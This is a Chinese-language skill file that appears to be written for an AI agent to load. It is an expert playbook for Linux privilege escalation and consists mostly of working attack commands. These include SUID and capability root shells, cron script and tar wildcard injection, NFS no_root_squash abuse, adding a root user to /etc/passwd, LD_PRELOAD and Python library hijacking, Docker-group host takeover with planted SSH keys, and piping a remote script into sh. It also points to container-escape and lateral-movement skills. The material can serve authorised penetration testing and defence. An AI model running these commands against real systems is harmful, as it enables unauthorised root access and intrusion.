# 技能：Linux 特权提升 — 专家攻击手册

> **AI 加载指令**：专家级 Linux 特权提升技术。涵盖枚举、SUID/SGID、能力、cron 滥用、内核漏洞、NFS、可写密码/shadow、LD_PRELOAD、Docker 组和库劫持。基础模型会遗漏通过能力及组合配置错误导致的微妙提升路径。

## 0. 相关路由

深入之前，考虑加载：

- 当目标是容器且需要逃逸到宿主机时，加载 `[container-escape-techniques](../container-escape-techniques/SKILL.md)`
- 当面临受限 Shell、AppArmor、SELinux 或 seccomp 时，加载 `[linux-security-bypass](../linux-security-bypass/SKILL.md)`
- 获取 root 后，用于向相邻主机横向移动时，加载 `[linux-lateral-movement](../linux-lateral-movement/SKILL.md)`
- 当宿主机是 Kubernetes 节点时，加载 `[kubernetes-pentesting](../kubernetes-pentesting/SKILL.md)`

### 高级参考

当您需要时，也加载：

- [SUID_CAPABILITIES_TRICKS.md](./SUID_CAPABILITIES_TRICKS.md)：
  - Top 30 SUID 二进制程序及精确利用命令（GTFOBins）
  - 针对每个危险能力的特定利用方法
  - 自定义 SUID 二进制利用方法

当您需要时，也加载：

- [KERNEL_EXPLOITS_CHECKLIST.md](./KERNEL_EXPLOITS_CHECKLIST.md)：
  - 内核版本 → 漏洞映射表（DirtyPipe、DirtyCow、OverlayFS 等）
  - 漏洞编译技巧及交叉编译说明
  - 内核漏洞稳定性评估

---

## 1. 枚举清单

获取 Shell 后立即运行：

### 系统信息

```bash
uname -a                        # 内核版本
cat /etc/os-release             # 发行版及版本
cat /proc/version               # 内核编译信息
hostname && id && whoami        # 当前上下文
```

### sudo & SUID/SGID

```bash
sudo -l                         # 我们能以 root 身份运行什么？
find / -perm -4000 -type f 2>/dev/null   # SUID 二进制程序
find / -perm -2000 -type f 2>/dev/null   # SGID 二进制程序
getcap -r / 2>/dev/null         # 具有能力的文件
```

### cron & 定时器

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
systemctl list-timers --all     # systemd 定时器
```

### 可写文件 & 目录

```bash
find / -writable -type f 2>/dev/null | grep -v proc
ls -la /etc/passwd /etc/shadow  # 检查权限
find / -perm -o+w -type d 2>/dev/null   # 世袭可写目录
```

### 网络 & 服务

```bash
ss -tlnp                        # 监听服务
cat /proc/net/tcp               # 原始 TCP 连接
ps aux                          # 运行进程
env                             # 环境变量（凭证？）
```

### 凭证位置

```bash
cat ~/.bash_history
cat ~/.mysql_history
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -30
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

---

## 2. SUID/SGID 利用

### GTFOBins 方法论

1. 查找 SUID 二进制程序：`find / -perm -4000 -type f 2>/dev/null`
2. 与 [GTFOBins](https://gtfobins.github.io/) 进行交叉引用
3. 使用 "SUID" 部分——并非所有二进制程序滥用都适用于 SUID

### 快速提升 SUID

| 二进制程序 | 命令 |
|---|---|
| `bash` | `bash -p` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `env` | `env /bin/sh -p` |
| `nmap` (旧版) | `nmap --interactive` → `!sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `less` | `less /etc/passwd` → `!/bin/sh` |
| `cp` | 复制 `/etc/passwd`，添加 root 用户，再复制回来 |

### 共享库劫持（SUID 二进制程序）

```bash
ldd /usr/local/bin/suid_binary                    # 检查加载的库
strace /usr/local/bin/suid_binary 2>&1 | grep -i "open.*\.so"  # 查找加载路径

# 如果它从可写目录加载——注入构造函数：
gcc -shared -fPIC -o /writable/path/libevil.so evil.c
# evil.c: __attribute__((constructor)) → setuid(0); system("/bin/bash -p")
```

---

## 3. 能力滥用

| 能力 | 风险 | 利用 |
|---|---|---|
| `cap_setuid` | **关键** | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| `cap_dac_override` | **关键** | 任意读写文件，无视权限 |
| `cap_dac_read_search` | **高** | 读取任意文件——导出 `/etc/shadow` |
| `cap_sys_admin` | **关键** | 挂载文件系统、BPF、命名空间操作 |
| `cap_sys_ptrace` | **高** | 通过 ptrace 注入到 root 进程 |
| `cap_net_raw` | **中** | 抓包流量、ARP 欺骗 |
| `cap_net_bind_service` | **低** | 绑定特权端口（<1024） |
| `cap_fowner` | **高** | 修改任意文件的所有权 |

```bash
# 查找具有能力的二进制程序
getcap -r / 2>/dev/null

# 示例：python3 具有 cap_setuid
# /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 4. cron / 定时器滥用

### 可写 cron 脚本

```bash
# 查找以 root 身份运行的 cron 任务
cat /etc/crontab | grep root
ls -la /etc/cron.d/

# 如果一个 root 拥有的 cron 运行可被当前用户写入的脚本：
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /writable/script.sh
# 等待 cron → /tmp/bash -p
```

### cron 中的 PATH 劫持

```bash
# 如果 crontab 有：PATH=/home/user:/usr/local/bin:/usr/bin
# 运行：* * * * * root backup.sh (无完整路径)
# 创建 /home/user/backup.sh：
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh
```

### 通配符注入（tar）

```bash
# 如果 cron 运行：tar czf /backup/archive.tar.gz *
# 在目标目录中创建：
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
# tar 将文件名解释为参数
```

### pspy — 无需 root 监控进程

```bash
# 上传 pspy64 或 pspy32 到目标
./pspy64
# 监控 cron 任务、服务和后台进程
```

---

## 5. NFS no_root_squash

```bash
# 在攻击者端：检查导出的共享
showmount -e TARGET_IP

# 如果 no_root_squash 设置：
mount -t nfs TARGET_IP:/share /mnt/nfs
# 在攻击者盒子上以 root 身份：
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# 在目标：
/share/bash -p    # root Shell
```

---

## 6. 可写 /etc/passwd 或 /etc/shadow

### 可写 /etc/passwd

```bash
# 生成密码哈希
openssl passwd -1 -salt xyz password123
# → $1$xyz$...hash...

# 添加 root 等价用户
echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd

# 或替换 root 的 'x' 为生成的哈希（如果没有 shadow 文件）
```

### 可写 /etc/shadow

```bash
# 生成 SHA-512 哈希
mkpasswd -m sha-512 password123

# 替换 /etc/shadow 中的 root 哈希
```

---

## 7. LD_PRELOAD / LD_LIBRARY_PATH 与 sudo

```bash
# 如果 sudo -l 显示：env_keep+=LD_PRELOAD 或 env_keep+=LD_LIBRARY_PATH
# 编译 .so 文件，其中 _init() 调用 setresuid(0,0,0) + system("/bin/bash -p")
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/some_allowed_binary
```

---

## 8. DOCKER 组 → root

```bash
# 如果当前用户在 docker 组中：
id    # 检查是否包含 "docker" 在 groups

# 挂载宿主机文件系统
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 或添加 SSH 密钥
docker run -v /root:/mnt --rm -it alpine sh -c \
  'echo "ssh-rsa AAAA..." >> /mnt/.ssh/authorized_keys'
```

---

## 9. PYTHON / PERL / RUBY 库劫持

```bash
# Python：如果 root 执行的脚本做 "import somelib"
# 检查 python 路径顺序：
python3 -c 'import sys; print("\n".join(sys.path))'

# 在可写路径中放置恶意模块，该路径优先级最高：
cat > /writable/path/somelib.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
EOF

# Perl：PERL5LIB / @INC 操作
# Ruby：RUBYLIB / $LOAD_PATH 操作
```

---

## 10. 自动化工具

| 工具 | 目的 | 命令 |
|---|---|---|
| **LinPEAS** | 全面枚举 | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **linux-exploit-suggester** | 内核漏洞建议 | `./linux-exploit-suggester.sh` |
| **pspy** | 监控进程（无需 root） | `./pspy64` |
| **LinEnum** | 传统枚举 | `./LinEnum.sh -t` |
| **GTFOBins** | SUID/sudo/能力滥用参考 | https://gtfobins.github.io/ |

---

## 11. 特权提升决策树

```
获取低权限 Shell
│
├── sudo -l 显示条目？
│   ├── GTFOBins 匹配？→ 直接利用
│   ├── env_keep 有 LD_PRELOAD？→ LD_PRELOAD 劫持 (§7)
│   ├── NOPASSWD 在自定义脚本？→ 审查脚本查找注入
│   └── (全部) 有密码？→ 检查密码重用/哈希
│
├── 查找 SUID/SGID 二进制程序？
│   ├── 标准二进制在 GTFOBins？→ SUID 利用 (§2)
│   ├── 自定义二进制？→ 反编译，检查库 (strace/ltrace)
│   └── 从可写路径加载共享库？→ 库劫持 (§2)
│
├── 二进制程序有能力的？
│   ├── cap_setuid？→ 立即 root (§3)
│   ├── cap_dac_override？→ 写入 /etc/passwd (§6)
│   ├── cap_sys_admin？→ 挂载 / 命名空间技巧
│   └── cap_sys_ptrace？→ 进程注入
│
├── root 身份运行的 cron 任务？
│   ├── 可写脚本？→ 注入载荷 (§4)
│   ├── 缺少完整路径？→ PATH 劫持 (§4)
│   └── 使用通配符？→ 通配符注入 (§4)
│
├── 可写敏感文件？
│   ├── /etc/passwd 可写？→ 添加 root 用户 (§6)
│   ├── /etc/shadow 可写？→ 替换 root 哈希 (§6)
│   └── 可写的 systemd 单元文件？→ 添加 ExecStartPre
│
├── Docker/LXD 组成员？
│   └── 是 → 挂载宿主机文件系统 (§8)
│
├── NFS 共享 no_root_squash？
│   └── 是 → 通过 NFS 的 SUID 二进制 (§5)
│
├── 内核版本旧/未打补丁？
│   └── 检查 KERNEL_EXPLOITS_CHECKLIST.md
│
└── 以上均非？
    ├── 运行 LinPEAS 进行全面扫描
    ├── 检查密码重用（bash_history、配置文件）
    ├── 检查内部服务（127.0.0.1 监听器）
    └── 使用 pspy 监控进程寻找隐藏机会
```
